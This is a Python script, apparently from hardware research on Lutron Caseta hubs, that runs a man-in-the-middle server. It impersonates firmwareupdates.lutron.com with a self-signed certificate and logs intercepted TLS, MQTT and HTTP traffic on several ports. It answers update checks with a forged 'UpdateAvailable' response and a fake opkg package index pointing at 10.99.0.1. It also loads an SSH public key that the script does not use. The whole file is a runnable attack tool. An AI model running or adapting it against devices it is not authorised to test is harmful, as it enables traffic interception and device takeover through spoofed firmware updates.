#!/usr/bin/env python3
"""
Simple MITM server - listens on multiple ports, logs everything.
Handles TLS with a self-signed cert. Catches firmware update requests.

Usage: sudo python3 tools/mitm-server.py
"""
import socket
import ssl
import threading
import json
import os
import subprocess
import sys
import time
import datetime

LISTEN = "0.0.0.0"
CERT_DIR = "/tmp/fake-lutron-certs"
CERT = os.path.join(CERT_DIR, "server.crt")
KEY = os.path.join(CERT_DIR, "server.key")
LOG = "/tmp/mitm-log.txt"

SSH_KEY = open(os.path.expanduser("~/.ssh/id_rsa_lutron.pub")).read().strip()

def ensure_cert():
    os.makedirs(CERT_DIR, exist_ok=True)
    if not os.path.exists(CERT):
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", KEY, "-out", CERT,
            "-days", "365", "-nodes",
            "-subj", "/CN=firmwareupdates.lutron.com"
        ], check=True, capture_output=True)
        print(f"[+] Generated cert")

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG, "a") as f:
        f.write(line + "\n")

def handle_tls_client(conn, addr, port):
    """Handle a TLS connection."""
    log(f"TLS:{port} connection from {addr}")
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    try:
        tls = ctx.wrap_socket(conn, server_side=True)
        data = tls.recv(8192)
        log(f"TLS:{port} received {len(data)} bytes from {addr}")
        log(f"TLS:{port} data: {data[:500]}")

        # Try to parse as HTTP
        text = data.decode("utf-8", errors="replace")
        if "POST" in text or "GET" in text:
            log(f"TLS:{port} HTTP request: {text.splitlines()[0] if text else '?'}")
            # Send a firmware update response
            body = json.dumps({
                "Status": "UpdateAvailable",
                "Url": "http://10.99.0.1:80/",
                "Message": "Update"
            })
            resp = f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
            tls.sendall(resp.encode())
            log(f"TLS:{port} sent response")
        else:
            log(f"TLS:{port} non-HTTP data (MQTT?): {data[:100].hex()}")
            # For MQTT, just log and close

        tls.shutdown(socket.SHUT_RDWR)
    except ssl.SSLError as e:
        log(f"TLS:{port} SSL error from {addr}: {e}")
    except Exception as e:
        log(f"TLS:{port} error from {addr}: {e}")
    finally:
        conn.close()

def handle_plain_client(conn, addr, port):
    """Handle a plain TCP/HTTP connection."""
    log(f"TCP:{port} connection from {addr}")
    try:
        data = conn.recv(8192)
        log(f"TCP:{port} received {len(data)} bytes: {data[:500]}")

        text = data.decode("utf-8", errors="replace")
        if "POST" in text or "GET" in text:
            path = text.splitlines()[0] if text else "?"
            log(f"TCP:{port} HTTP: {path}")

            # Serve opkg package or index
            if "Packages" in path:
                body = b"Package: lutron-update\nVersion: 99.0.0\nArchitecture: armv7l\nFilename: update.ipk\nSize: 100\n\n"
            else:
                body = json.dumps({"Status": "ok", "Url": "http://10.99.0.1/"}).encode()

            resp = f"HTTP/1.1 200 OK\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body
            conn.sendall(resp)
        else:
            log(f"TCP:{port} raw: {data[:200].hex()}")
    except Exception as e:
        log(f"TCP:{port} error: {e}")
    finally:
        conn.close()

def listen_port(port, use_tls=True):
    """Listen on a port and handle connections."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((LISTEN, port))
    except OSError as e:
        log(f"FAILED to bind port {port}: {e}")
        return
    srv.listen(5)
    log(f"Listening on :{port} ({'TLS' if use_tls else 'TCP'})")

    while True:
        try:
            conn, addr = srv.accept()
            handler = handle_tls_client if use_tls else handle_plain_client
            t = threading.Thread(target=handler, args=(conn, addr, port), daemon=True)
            t.start()
        except Exception as e:
            log(f"Accept error on :{port}: {e}")

if __name__ == "__main__":
    ensure_cert()

    # Clear log
    open(LOG, "w").close()

    ports = [
        (443, True),    # HTTPS - firmwareupdates.lutron.com
        (8883, True),   # MQTTS - AWS IoT
        (80, False),    # HTTP - opkg repo
        (8443, True),   # HTTPS alt
        (4443, True),   # Association HTTPS
    ]

    threads = []
    for port, tls in ports:
        t = threading.Thread(target=listen_port, args=(port, tls), daemon=True)
        t.start()
        threads.append(t)

    print(f"\n[*] MITM server ready. Logging to {LOG}")
    print(f"[*] Listening on ports: {[p for p,_ in ports]}")
    print(f"[*] Waiting for Caseta connections...\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Done")
